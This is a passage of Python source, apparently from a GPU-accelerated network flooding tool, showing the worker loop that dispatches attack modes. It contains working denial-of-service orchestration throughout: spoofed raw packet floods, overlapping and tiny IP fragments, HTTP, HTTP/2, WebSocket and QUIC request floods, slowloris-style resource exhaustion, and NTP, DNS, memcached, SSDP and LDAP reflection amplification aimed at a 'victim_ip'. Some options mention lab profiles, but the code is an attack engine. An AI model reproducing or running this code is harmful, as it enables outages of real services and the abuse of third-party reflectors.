                            worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                                packets_buffer=std_send["cpu"],
                                target_ip=args['target'],
                                target_port=args['port'],
                                count=std_send["count"],
                                verbose=args['verbose'],
                                pacing_config=pacing_cfg,
                                live_sent=sent_total,
                                live_errors=errors_total,
                                live_progress=progress
                            ))
                    
                    # Overlapping fragments if requested
                    if has_overlap:
                        frag_buf, pair_size = anomaly_packet.generate_overlapping_fragments(
                            count=args['count'] // 2 or 1,
                            target_ip=args['target'],
                            target_port=args['port'],
                            real_src_ip=real_src_ip,
                            spoof_ip=args['spoof'],
                            has_ethernet=True,
                            stream=stream,
                            gateway_mac=gw_mac_int,
                            spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                        )
                        stream.synchronize()
                        cpu_frags = _gpu_to_host(frag_buf, "anomaly_overlap")
                        frag_count = len(cpu_frags) // pair_size
                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=cpu_frags,
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=frag_count,
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        ))
                    
                    # Tiny fragments if requested
                    if has_tiny:
                        tiny_buf, tiny_size = anomaly_packet.generate_tiny_fragments(
                            count=args['count'] // 2 or 1,
                            target_ip=args['target'],
                            target_port=args['port'],
                            real_src_ip=real_src_ip,
                            spoof_ip=args['spoof'],
                            has_ethernet=True,
                            stream=stream,
                            gateway_mac=gw_mac_int,
                            spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                        )
                        stream.synchronize()
                        cpu_tiny = _gpu_to_host(tiny_buf, "anomaly_tiny")
                        tiny_count = len(cpu_tiny) // tiny_size
                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=cpu_tiny,
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=tiny_count,
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        ))
                
                return

            # Hybrid Mode: prefer full-GPU variation path for basic L4 traffic.
            protocol_name = str(args.get("protocol", "tcp") or "tcp").strip().lower()
            source_port = int(args.get("source_port", 0) or 0)
            pad_size = int(args.get("pad", 0) or 0)
            payloads = list(args.get("payloads", []) or [])
            has_custom_payload = any(bool(p) for p in payloads)
            is_basic_vector = str(args.get("attack_vector", "basic") or "basic").strip().lower() == "basic"
            full_gpu_hotpath_ok = (
                _gpu_full_variation
                and is_basic_vector
                and protocol_name in {"tcp", "udp", "icmp"}
                and not bool(args.get("fragment", False))
                and not has_custom_payload
                and pad_size <= 0
                and source_port <= 0
            )

            gw_mac_str = get_gateway_mac(args['target'])
            gw_mac_int = mac_to_int(gw_mac_str)
            total_count = int(args['count'])
            remaining = total_count
            BATCH_SIZE = int(_gpu_batch_size)
            stream_ring = _build_stream_ring()
            stream_idx = 0
            ring_q = asyncio.Queue(maxsize=_gpu_ring_capacity)
            real_src_ip_for_gpu = str(args.get('spoof_ip') or utils.get_local_ip() or real_src_ip)

            if full_gpu_hotpath_ok:
                tcp_flags_raw = args.get("tcp_flags", "S")
                if isinstance(tcp_flags_raw, str):
                    try:
                        tcp_flags_int = int(cpu_packet_engine.parse_tcp_flags(tcp_flags_raw))
                    except Exception:
                        tcp_flags_int = 0x02
                else:
                    try:
                        tcp_flags_int = int(tcp_flags_raw or 0x02)
                    except Exception:
                        tcp_flags_int = 0x02
                window_override = (
                    int(args.get("window", -1) if args.get("window", None) is not None else -1)
                )

                log_info(
                    f"[Worker {worker_id}] GPU full-variation hot-path aktif: "
                    f"proto={protocol_name}, batch={BATCH_SIZE}, streams={len(stream_ring)}, depth={_gpu_pipeline_depth}"
                )
                while remaining > 0:
                    batch_count = min(remaining, BATCH_SIZE)
                    gpu_res = gpu_packet.generate_packets(
                        count=batch_count,
                        target_ip=args['target'],
                        target_port=args['port'],
                        protocol=protocol_name,
                        spoof_ip=bool(args.get("spoof", False)),
                        real_src_ip=real_src_ip_for_gpu,
                        tcp_flags=tcp_flags_int,
                        has_ethernet=True,
                        window=window_override,
                        stream=stream_ring[stream_idx],
                        gateway_mac=gw_mac_int,
                        spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8'),
                        return_host_ready=True,
                    )
                    if gpu_res is None:
                        log_error("GPU full-variation packet generation failed.")
                        break
                    packets_gpu_array, packet_size = gpu_res
                    remaining -= batch_count

                    current_batch = {
                        "cpu": _gpu_to_host(
                            packets_gpu_array,
                            f"fullvar_slot{stream_idx}",
                            stream=stream_ring[stream_idx],
                            blocking=False,
                        ),
                        "count": batch_count,
                        "packet_size": int(packet_size),
                        "stream": stream_ring[stream_idx],
                        "slot": stream_idx,
                        "ready_event": _make_ready_event(stream_ring[stream_idx]),
                    }
                    if ring_q.full():
                        await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
                    await _enqueue_with_backpressure(ring_q, current_batch)
                    stream_idx = (stream_idx + 1) % len(stream_ring)
                    await _drain_ring_to_depth(
                        ring_q,
                        args['port'],
                        keep_depth=_gpu_pipeline_depth - 1,
                        ingest_state=True,
                    )
                    await asyncio.sleep(0)

                while not ring_q.empty():
                    await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
                return

            # Template-pool fallback for vectors/options not supported by full-GPU hot-path.
            if args['attack_vector'] == "http":
                TEMPLATE_POOL_SIZE = max(1, int(args.get("gpu_template_pool_size_l7", 50) or 50))
            else:
                TEMPLATE_POOL_SIZE = max(1, int(args.get("gpu_template_pool_size_l4", 10) or 10))

            template_pool = []
            for _ in range(TEMPLATE_POOL_SIZE):
                pkt_config = packet.PacketConfig(
                    target_ip=args['target'],
                    target_port=args['port'],
                    protocol=args['protocol'],
                    spoof=False,
                    payload=args['payloads'][0] if args['payloads'] else None,
                    tcp_flags=args['tcp_flags'],
                    ttl=args['ttl'],
                    tos=args['tos'],
                    window=args['window'],
                    fragment_enabled=args.get('fragment', False),
                    fragment_size=args.get('fragment_size', 800),
                    pad_size=args['pad'],
                    attack_vector=args['attack_vector']
                )

                template_pkt = packet.create_packet(pkt_config)
                full_bytes = bytes(template_pkt)
                has_ether_in_bytes = (
                    len(full_bytes) >= 34 and
                    (full_bytes[14] & 0xF0) == 0x40 and
                    (full_bytes[0] & 0xF0) != 0x40
                )

                if not has_ether_in_bytes:
                    try:
                        iface, gw_mac_bytes = senders.get_gateway_info(args['target'])
                        if not gw_mac_bytes:
                            dst_mac_bytes = b'\xff\xff\xff\xff\xff\xff'
                            iface = "eth0"
                        else:
                            dst_mac_bytes = gw_mac_bytes

                        from scapy.all import get_if_hwaddr
                        try:
                            src_mac_str = get_if_hwaddr(iface)
                            clean_src_mac = src_mac_str.strip().replace(':', '').replace('-', '').replace(' ', '')
                            src_mac_bytes = bytes.fromhex(clean_src_mac)
                        except Exception:
                            src_mac_bytes = b'\x00\x00\x00\x00\x00\x00'

                        eth_type = b'\x08\x00'
                        ether_header = dst_mac_bytes + src_mac_bytes + eth_type
                        t_bytes = ether_header + full_bytes
                    except Exception as e:
                        log_error(f"Failed to add Ether: {e}")
                        t_bytes = b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00' + full_bytes
                else:
                    t_bytes = full_bytes

                is_ether_ip = len(t_bytes) >= 34 and (t_bytes[14] & 0xF0) == 0x40
                is_ip_only = len(t_bytes) >= 20 and (t_bytes[0] & 0xF0) == 0x40 and not is_ether_ip
                if not (is_ether_ip or is_ip_only):
                    log_error("[CRITICAL] Generated template: Invalid format!")
                    return

                check_offset = 14 if is_ether_ip else 0
                if (t_bytes[check_offset] & 0xF0) != 0x40:
                    log_error(f"[CRITICAL] Generated template: Invalid IP at offset {check_offset}")
                    return
                template_pool.append(t_bytes)

            if template_pool:
                target_size = len(template_pool[0])
                normalized_pool = []
                for t in template_pool:
                    if len(t) == target_size:
                        normalized_pool.append(t)
                    elif len(t) < target_size:
                        normalized_pool.append(t + b'\x00' * (target_size - len(t)))
                    else:
                        normalized_pool.append(t[:target_size])
                template_pool = normalized_pool

            for i, t in enumerate(template_pool):
                chk_offset = 14 if (len(t) > 14 and t[0] != 0x45) else 0
                if len(t) <= chk_offset or (t[chk_offset] & 0xF0) != 0x40:
                    val = t[chk_offset] if len(t) > chk_offset else 0
                    log_error(f"[CRITICAL] Template {i} is invalid! Len: {len(t)}, Byte{chk_offset}: 0x{val:02x}")
                    return

            log_info(
                f"[Worker {worker_id}] GPU template-pool path: pool={TEMPLATE_POOL_SIZE}, "
                f"batch={BATCH_SIZE}, streams={len(stream_ring)}, depth={_gpu_pipeline_depth}"
            )
            while remaining > 0:
                batch_count = min(remaining, BATCH_SIZE)
                gpu_res = gpu_packet.generate_packets_from_template_pool(
                    templates_bytes_list=template_pool,
                    count=batch_count,
                    target_ip=args['target'],
                    spoof_ip=args['spoof'],
                    real_src_ip=real_src_ip_for_gpu,
                    specific_src_port=args.get('source_port', -1),
                    has_ethernet=True,
                    stream=stream_ring[stream_idx],
                    gateway_mac=gw_mac_int,
                    spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8'),
                    return_host_ready=True,
                )
                if gpu_res is None:
                    log_error("GPU packet generation failed.")
                    break

                packets_gpu_array, packet_size = gpu_res
                remaining -= batch_count

                current_batch = {
                    "cpu": _gpu_to_host(
                        packets_gpu_array,
                        f"template_pool_slot{stream_idx}",
                        stream=stream_ring[stream_idx],
                        blocking=False,
                    ),
                    "count": batch_count,
                    "packet_size": int(packet_size),
                    "stream": stream_ring[stream_idx],
                    "slot": stream_idx,
                    "ready_event": _make_ready_event(stream_ring[stream_idx]),
                }
                if ring_q.full():
                    await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
                await _enqueue_with_backpressure(ring_q, current_batch)
                stream_idx = (stream_idx + 1) % len(stream_ring)
                await _drain_ring_to_depth(
                    ring_q,
                    args['port'],
                    keep_depth=_gpu_pipeline_depth - 1,
                    ingest_state=True,
                )
                await asyncio.sleep(0)

            while not ring_q.empty():
                await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)

        elif args['attack_vector'] == "http":
            verify_ssl = (str(args['http_verify']).lower() != "false")
            if bool(args.get('stateful', False)):
                worker_stats = _add_stats(worker_stats, await senders.http_stateful_sender(
                    args['target'], args['port'],
                    args['count'], args['http_concurrency'],
                    workflow_steps=None,
                    verbose=args['verbose'],
                    scheme=args['http_scheme'],
                    verify=verify_ssl,
                    timeout_s=args['http_timeout'],
                    ssl_context=ssl_context,
                    user_agent=args.get('user_agent'),
                    retries=args.get('http_retries', 0),
                    http_method=args.get('http_method', 'GET'),
                    http_path=args.get('http_path', ['/']),
                    payloads=args.get('payloads', []),
                    session_repeats=args.get('l7_session_repeats', 1),
                    max_active_sessions=args.get('l7_max_active_sessions', 0),
                    l7_engine=args.get('l7_engine', 'python'),
                    legacy_path_enable=bool(args.get('legacy_path_enable', False)),
                    lab_profile=args.get('lab_profile', 'off'),
                    l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                    l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                    live_sent=sent_total,
                    live_errors=errors_total,
                    live_progress=progress,
                ))
            else:
                worker_stats = _add_stats(worker_stats, await senders.http_app_sender(
                    args['target'], args['port'], args['count'], args['http_concurrency'],
                    args['http_method'], args['http_path'], args['payloads'], args['verbose'],
                    scheme=args['http_scheme'], verify=verify_ssl, timeout_s=args['http_timeout'], retries=args['http_retries'],
                    ssl_context=ssl_context,
                    cookies=args.get('cookies'),
                    user_agent=args.get('user_agent'),
                    live_sent=sent_total,
                    live_errors=errors_total,
                    live_progress=progress
                ))
        elif args['attack_vector'] == "http2":
            verify_ssl = (str(args.get('http_verify', 'true')).lower() != "false")
            worker_stats = _add_stats(worker_stats, await senders.http2_sender(
                target_ip=args['target'],
                target_port=args['port'],
                count=args['count'],
                concurrency=args['http2_concurrency'],
                http2_connections=args.get("http2_connections", 1),
                http2_streams_per_conn=args.get("http2_streams_per_conn", 100),
                http_path=args['http_path'],
                http_method=args['http_method'],
                verbose=args['verbose'],
                scheme=args['http_scheme'],
                cookies=args.get('cookies'),
                user_agent=args.get('user_agent'),
                ssl_context=ssl_context,
                verify=verify_ssl,
                h2_profile_name=args.get("h2_profile", args.get("ja3_profile", "none")),
                h2_transport_name=args.get("h2_transport", "auto"),
                l7_http2_engine=args.get("l7_http2_engine", "auto"),
                l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                lab_profile=args.get("lab_profile", "off"),
                quic_streams_per_conn=int(args.get("quic_streams_per_conn", 0) or 0),
                quic_requests_per_conn=int(args.get("quic_requests_per_conn", 0) or 0),
                quic_conn_pool_size=int(args.get("quic_conn_pool_size", 1) or 1),
                quic_expect_status_min=int(args.get("quic_expect_status_min", 200) or 200),
                quic_expect_status_max=int(args.get("quic_expect_status_max", 399) or 399),
                quic_require_response_headers=bool(args.get("quic_require_response_headers", True)),
                quic_require_response_body=bool(args.get("quic_require_response_body", False)),
                quic_min_response_body_bytes=int(args.get("quic_min_response_body_bytes", 0) or 0),
                quic_expect_header_name=str(args.get("quic_expect_header_name", "") or ""),
                quic_expect_header_value_contains=str(args.get("quic_expect_header_value_contains", "") or ""),
                quic_expect_body_substring=str(args.get("quic_expect_body_substring", "") or ""),
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))

        elif args['attack_vector'] == "websocket":
            if bool(args.get("ws_scenario", False)):
                worker_stats = _add_stats(worker_stats, await senders.websocket_scenario_sender(
                    target_ip=args['target'],
                    target_port=args['port'],
                    count=args['count'],
                    concurrency=args['ws_concurrency'],
                    ws_path=args['ws_path'],
                    verbose=args['verbose'],
                    auth_message=args.get("ws_auth_message", ""),
                    subscribe_messages=args.get("ws_subscribe_message"),
                    ping_message=args.get("ws_message", "ping"),
                    ping_count=args.get("ws_ping_count", 1),
                    await_response=bool(args.get("ws_await_response", False)),
                    l7_engine=args.get('l7_engine', 'python'),
                    legacy_path_enable=bool(args.get('legacy_path_enable', False)),
                    lab_profile=args.get('lab_profile', 'off'),
                    l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                    l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                    ssl_context=ssl_context,
                    live_sent=sent_total,
                    live_errors=errors_total,
                    live_progress=progress,
                ))
            else:
                worker_stats = _add_stats(worker_stats, await senders.websocket_sender(
                    target_ip=args['target'],
                    target_port=args['port'],
                    count=args['count'],
                    concurrency=args['ws_concurrency'],
                    ws_path=args['ws_path'],
                    ws_message=args['ws_message'],
                    verbose=args['verbose'],
                    ssl_context=ssl_context,
                    live_sent=sent_total,
                    live_errors=errors_total,
                    live_progress=progress
                ))

        elif args['attack_vector'] == "quic":
            # QUIC uses UDP
            worker_stats = _add_stats(worker_stats, await senders.quic_sender(
                target_ip=args['target'],
                target_port=args['port'],
                count=args['count'],
                concurrency=args['quic_concurrency'],
                quic_path=args['quic_path'],
                quic_method=args['quic_method'],
                verbose=args['verbose'],
                ssl_context=ssl_context,
                l7_quic_engine=args.get("l7_quic_engine", "auto"),
                l7_quic_require_native=bool(args.get("l7_quic_require_native", False)),
                l7_fallback_policy=args.get("l7_fallback_policy", "allow"),
                l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                lab_profile=args.get("lab_profile", "off"),
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))

        elif args['attack_vector'] in ["slow-post", "slow-read", "slowloris"]:
            # Map slowloris to slow-read (effective resource exhaustion) or slow-post
            attack_type = args['attack_vector']
            if attack_type == "slowloris":
                attack_type = "slow-read" # Use slow-read logic for slowloris general vector

            verify_ssl = (str(args['http_verify']).lower() != "false")
            worker_stats = _add_stats(worker_stats, await senders.slow_attack_sender(
                target_ip=args['target'],
                target_port=args['port'],
                count=args['count'],
                concurrency=args['slowloris_concurrency'] if args['attack_vector'] == "slowloris" else args['http_concurrency'], 
                attack_type=attack_type,
                verbose=args['verbose'],
                ssl_context=ssl_context if verify_ssl else None,
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))
        elif args['attack_vector'] == "pcap-replay":
            # ── PCAP Replay Engine ──
            from . import pcap_replay as pcap_mod

            pcap_filter = pcap_mod.PcapFilterConfig(
                protocols=args.get('pcap_filter_proto'),
                src_ip=args.get('pcap_filter_src_ip'),
                dst_ip=args.get('pcap_filter_dst_ip'),
                src_port=args.get('pcap_filter_src_port'),
                dst_port=args.get('pcap_filter_dst_port'),
                min_len=int(args.get('pcap_filter_min_len', 0) or 0),
                max_len=int(args.get('pcap_filter_max_len', 0) or 0),
            )

            replay_cfg = pcap_mod.PcapReplayConfig(
                pcap_file=str(args.get('pcap_file', '')),
                timing_mode=str(args.get('pcap_timing', 'original')),
                speed_multiplier=float(args.get('pcap_speed', 1.0) or 1.0),
                target_rps=float(args.get('rps', 0) or 0),
                loops=int(args.get('pcap_loops', 1) or 1),
                target_ip_override=args.get('target'),
                target_port_override=args.get('port'),
                src_ip_override=args.get('pcap_src_ip_override'),
                src_port_override=args.get('pcap_src_port_override'),
                filter_cfg=pcap_filter,
                use_l2=bool(args.get('pcap_use_l2', False)),
                strip_ethernet=bool(args.get('pcap_strip_eth', False)),
                verbose=bool(args.get('verbose', False)),
                batch_size=int(args.get('pcap_batch_size', 512) or 512),
                max_packets=int(args.get('pcap_max_packets', 0) or 0),
                flow_aware_rewrite=not bool(args.get('pcap_no_flow_aware', False)),
            )

            log_info(f"[Worker {worker_id}] PCAP Replay başlatılıyor: {replay_cfg.pcap_file}")

            replay_result = await pcap_mod.replay_pcap(
                replay_cfg,
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress,
                pacing_config=pacing_cfg if pacing_cfg.pacing_mode != PacingMode.NONE else None,
            )
            worker_stats = _add_stats(worker_stats, replay_result)

        elif args['attack_vector'] in ["ntp-amp", "ssdp-amp", "dns-amp", "memcached-amp", "ldap-amp"]:
            worker_stats = _add_stats(worker_stats, await senders.amplification_sender(
                victim_ip=args['target'],
                count=args['count'],
                rps=args['rps'],
                reflector_file=args['reflector_file'],
                amp_type=args['attack_vector'],
                verbose=args['verbose'],
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))
        else: # This is the CPU path for raw packets
            spoof_opts = packet.SpoofingOptions(
                mode=args['spoof_mode'],
                subnet=args['spoof_subnet'],
                list_file=args['spoof_list_file']
            )
            p_config = packet.PacketConfig(
                target_ip=args['target'],
                target_port=args['port'],
                protocol=args['protocol'],
                spoof=args['spoof'],
                spoof_opts=spoof_opts,
                payload=args['payloads'][0] if args['payloads'] else None,
                tcp_flags=args['tcp_flags'],
                ttl=args['ttl'],
                tos=args['tos'],
                window=args['window'],
                fragment_enabled=args.get('fragment', False),
                fragment_size=args.get('fragment_size', 800),
                pad_size=args['pad'],
                attack_vector=args['attack_vector'],
                dns_name=args['dns_name'],
                dns_qtype=args['dns_qtype'],
                dns_edns=args['dns_edns'],
                dns_recursive=not args['dns_nord']
            )
            packet_sender_kwargs = {
                "packet_config": p_config,
                "count": args['count'],
                "delay": args['delay'],
                "rps": args['rps'],
                "jitter": args['jitter'],
                "ramp": args['ramp'],
                "verbose": args['verbose'],
                "live_sent": sent_total,
                "live_errors": errors_total,
                "live_progress": progress,
            }

            use_cpu_c_pacing = (
                pacing_cfg.pacing_mode != PacingMode.NONE
                and PACING_ENGINE_AVAILABLE
                and not bool(args.get("fragment", False))
            )
            use_cpu_direct_sender = (
                pacing_cfg.pacing_mode == PacingMode.NONE
                and not bool(args.get("fragment", False))
                and (
                    str(args.get("sender_backend", "auto") or "auto").strip().lower() != "auto"
                    or bool(args.get("xdp_enable", False))
                )
            )

            if use_cpu_c_pacing:
                try:
                    engine_spoof_opts = cpu_packet_engine.SpoofingOptions(
                        mode=args['spoof_mode'],
                        subnet=args['spoof_subnet'],
                        list_file=args['spoof_list_file'],
                    )
                    engine_cfg = cpu_packet_engine.PacketConfig(
                        target_ip=args['target'],
                        target_port=args['port'],
                        protocol=args['protocol'],
                        spoof=args['spoof'],
                        spoof_opts=engine_spoof_opts,
                        payload=args['payloads'][0] if args['payloads'] else None,
                        tcp_flags=args['tcp_flags'],
                        ttl=args['ttl'],
                        tos=args['tos'],
                        window=args['window'],
                        fragment_enabled=False,
                        pad_size=args['pad'],
                        attack_vector=args['attack_vector'],
                        dns_name=args['dns_name'],
                        dns_qtype=args['dns_qtype'],
                        dns_edns=args['dns_edns'],
                        dns_recursive=not args['dns_nord'],
                    )

                    cpu_pacing_batch = max(
                        1,
                        int(args.get("cpu_pacing_batch", 65536) or 65536),
                    )
                    remaining = int(args['count'] or 0)

                    while remaining > 0:
                        batch_count = min(remaining, cpu_pacing_batch)
                        packets_buffer, packet_size = cpu_packet_engine.generate_packet_pool(
                            engine_cfg,
                            batch_count,
                            uniform_size=True,
                            low_peak_memory=True,
                        )
                        expected_bytes = int(packet_size) * int(batch_count)
                        if packet_size <= 0 or len(packets_buffer) < expected_bytes:
                            raise RuntimeError(
                                f"invalid packet pool size={packet_size} bytes={len(packets_buffer)} count={batch_count}"
                            )

                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=packets_buffer,
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=batch_count,
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress,
                        ))
                        remaining -= batch_count
                        await asyncio.sleep(0)
                except Exception as e:
                    log_warning(
                        f"[Worker {worker_id}] CPU paced sender pool path failed ({e}); packet_sender fallback."
                    )
                    worker_stats = _add_stats(worker_stats, await senders.packet_sender(**packet_sender_kwargs))
            elif use_cpu_direct_sender:
                try:
                    engine_spoof_opts = cpu_packet_engine.SpoofingOptions(
                        mode=args['spoof_mode'],
                        subnet=args['spoof_subnet'],
                        list_file=args['spoof_list_file'],
                    )
                    engine_cfg = cpu_packet_engine.PacketConfig(
                        target_ip=args['target'],
                        target_port=args['port'],
                        protocol=args['protocol'],
                        spoof=args['spoof'],
                        spoof_opts=engine_spoof_opts,
                        payload=args['payloads'][0] if args['payloads'] else None,
                        tcp_flags=args['tcp_flags'],
                        ttl=args['ttl'],
                        tos=args['tos'],
                        window=args['window'],
                        fragment_enabled=False,
                        pad_size=args['pad'],
                        attack_vector=args['attack_vector'],
                        dns_name=args['dns_name'],
                        dns_qtype=args['dns_qtype'],
                        dns_edns=args['dns_edns'],
                        dns_recursive=not args['dns_nord'],
                    )
                    packets_buffer, packet_size = cpu_packet_engine.generate_packet_pool(
                        engine_cfg,
                        int(args['count'] or 0),
                        uniform_size=True,
                        low_peak_memory=True,
                    )
                    expected_bytes = int(packet_size) * int(args['count'] or 0)
                    if packet_size <= 0 or len(packets_buffer) < expected_bytes:
                        raise RuntimeError(
                            f"invalid packet pool size={packet_size} bytes={len(packets_buffer)} count={args['count']}"
                        )
                    worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                        packets_buffer=packets_buffer,
                        target_ip=args['target'],
                        target_port=args['port'],
                        count=int(args['count'] or 0),
                        verbose=args['verbose'],
                        pacing_config=None,
                        live_sent=sent_total,
                        live_errors=errors_total,
                        live_progress=progress,
                    ))
                except Exception as e:
                    log_warning(
                        f"[Worker {worker_id}] Direct sender backend path failed ({e}); packet_sender fallback."
                    )
                    worker_stats = _add_stats(worker_stats, await senders.packet_sender(**packet_sender_kwargs))
            else:
                if pacing_cfg.pacing_mode != PacingMode.NONE and bool(args.get("fragment", False)):
                    log_warning(
                        f"[Worker {worker_id}] Fragmentation with C pacing not supported on CPU path; packet_sender fallback."
                    )
                worker_stats = _add_stats(worker_stats, await senders.packet_sender(**packet_sender_kwargs))
    except KeyboardInterrupt:
        worker_status = "interrupted"
    except Exception as e:
        worker_status = "failed"
        worker_error = f"{type(e).__name__}: {e}"
        log_error(f"[Worker {worker_id}] hata: {worker_error}")
    finally:
        _resource_monitor_stop = True
        try:
            _resource_monitor_task.cancel()
        except Exception:
            pass

        # Final resource snapshot before process teardown.
        try:
            _update_resource_stats(force=True)
        except Exception:
            pass

        # Restore original sender symbol for safety inside the process lifetime.
        try:
            senders.paced_raw_socket_sender = _orig_paced_sender
        except Exception:
            pass
        try:
            if hasattr(senders, "close_sender_context"):
                senders.close_sender_context(sender_context_cache)
        except Exception:
            pass

        try:
            if int(worker_stats.get("attempted", 0) or 0) <= 0:
                worker_stats["attempted"] = int(args.get("count", 0) or 0)
            worker_stats["errors"] = max(
                int(worker_stats.get("errors", 0) or 0),
                max(0, int(worker_stats.get("attempted", 0) or 0) - int(worker_stats.get("sent", 0) or 0)),
            )

            # Pull GPU generation telemetry once per worker (if available).
            if _gpu_packet_mod is not None and hasattr(_gpu_packet_mod, "get_generation_telemetry"):
                try:
                    gtel = _gpu_packet_mod.get_generation_telemetry() or {}
                    worker_stats["gpu_template_h2d_copy_count"] = int(worker_stats.get("gpu_template_h2d_copy_count", 0) or 0) + int(gtel.get("gpu_template_h2d_copy_count", 0) or 0)
                    worker_stats["gpu_template_h2d_copy_bytes"] = int(worker_stats.get("gpu_template_h2d_copy_bytes", 0) or 0) + int(gtel.get("gpu_template_h2d_copy_bytes", 0) or 0)
                    worker_stats["gpu_rng_state_alloc_count"] = int(worker_stats.get("gpu_rng_state_alloc_count", 0) or 0) + int(gtel.get("gpu_rng_state_alloc_count", 0) or 0)
                    worker_stats["gpu_rng_state_reuse_count"] = int(worker_stats.get("gpu_rng_state_reuse_count", 0) or 0) + int(gtel.get("gpu_rng_state_reuse_count", 0) or 0)
                except Exception:
                    pass

            worker_stats["gpu_ring_depth_peak"] = int(max(0, _gpu_ring_depth_peak))
            worker_stats["gpu_ring_block_wait_ns"] = int(max(0, _gpu_ring_block_wait_ns))
            _update_state_engine_stats()

            # Recompute bounded loss metrics at worker finalization.
            worker_stats = _recompute_loss_metrics(worker_stats)
        except Exception:
            pass

        # Derive worker_status from actual send results (don't blindly report "ok")
        if worker_status == "ok":
            _ws_sent = int(worker_stats.get("sent", 0) or 0)
            _ws_attempted = int(worker_stats.get("attempted", 0) or 0)
            _ws_errors = int(worker_stats.get("errors", 0) or 0)
            if _ws_attempted > 0 and _ws_sent == 0:
                worker_status = "failed"
                if not worker_error:
                    worker_error = f"0/{_ws_attempted} packets sent ({_ws_errors} errors)"
            elif _ws_attempted > 0 and _ws_errors > _ws_sent:
                worker_status = "degraded"
                if not worker_error:
                    worker_error = f"high error rate: {_ws_errors}/{_ws_attempted}"

        # Dedicated + required dataplane policy:
        # Any sender fallback or sender-path drift is considered a hard failure.
        if worker_status == "ok":
            _lab_profile = str(args.get("lab_profile", "off") or "off").strip().lower()
            _core_mode = str(args.get("dataplane_core_mode", "off") or "off").strip().lower()
            _hot_path_strict = (_lab_profile == "dedicated" and _core_mode == "required")
            if _hot_path_strict:
                _ws_sender_path = str(worker_stats.get("sender_path", "") or "").strip()
                _ws_fallback_reason = str(worker_stats.get("sender_fallback_reason", "none") or "none").strip().lower()
                _ws_fallback_count = int(worker_stats.get("fallback_count", 0) or 0)
                _has_sender_drift = bool(_ws_sender_path.upper() == "MIXED")
                _has_sender_fallback = bool(_ws_fallback_reason not in {"", "none"} or _ws_fallback_count > 0)
                if _has_sender_drift or _has_sender_fallback:
                    worker_status = "failed"
                    if not worker_error:
                        worker_error = (
                            "hot_path_policy_violation: "
                            f"sender_path={_ws_sender_path or 'unknown'} "
                            f"fallback_reason={_ws_fallback_reason or 'none'} "
                            f"fallback_count={_ws_fallback_count}"
                        )

        # NOTE:
        # Live counters are already streamed incrementally by sender functions
        # through live_progress/live_sent/live_errors. Adding worker_stats again
        # here causes double counting (e.g. >100% progress and inflated PPS).

        if run_events is not None:
            try:
                # Collect sender_path from last batch stats if available
                _sender_path = str(worker_stats.get("sender_path", "") or "").strip() or "unknown"
                _fallback_count = int(worker_stats.get("fallback_count", 0) or 0)
                _sender_fallback_reason = str(worker_stats.get("sender_fallback_reason", "none") or "none")
                _perm_errors = int(worker_stats.get("permission_error_count", 0) or 0)
                _buffer_copy_count = int(worker_stats.get("buffer_copy_count", 0) or 0)
                _buffer_copy_bytes = int(worker_stats.get("buffer_copy_bytes", 0) or 0)
                _buffer_reuse_hits = int(worker_stats.get("buffer_reuse_hits", 0) or 0)
                _eagain_retry_count = int(worker_stats.get("eagain_retry_count", 0) or 0)
                _partial_send_retry_count = int(worker_stats.get("partial_send_retry_count", 0) or 0)
                _actual_rps = float(worker_stats.get("actual_rps", 0.0) or 0.0)
                _rate_accuracy_pct = float(worker_stats.get("rate_accuracy_pct", 0.0) or 0.0)
                _jitter_p99_ns = float(worker_stats.get("jitter_p99_ns", 0.0) or 0.0)
                _ipg_mean_ns = float(worker_stats.get("ipg_mean_ns", 0.0) or 0.0)
                _sleep_calls = int(worker_stats.get("sleep_calls", 0) or 0)
                _busywait_cycles = int(worker_stats.get("busywait_cycles", 0) or 0)
                _so_txtime_active = int(worker_stats.get("so_txtime_active", 0) or 0)
                _txtime_errors = int(worker_stats.get("txtime_errors", 0) or 0)
                _txring_flush_call_count = int(worker_stats.get("txring_flush_call_count", 0) or 0)
                _txring_flush_error_count = int(worker_stats.get("txring_flush_error_count", 0) or 0)
                _txring_flush_eagain_count = int(worker_stats.get("txring_flush_eagain_count", 0) or 0)
                _txring_flush_enobufs_count = int(worker_stats.get("txring_flush_enobufs_count", 0) or 0)
                _txring_flush_ebusy_count = int(worker_stats.get("txring_flush_ebusy_count", 0) or 0)
                _txring_flush_other_errno_count = int(worker_stats.get("txring_flush_other_errno_count", 0) or 0)
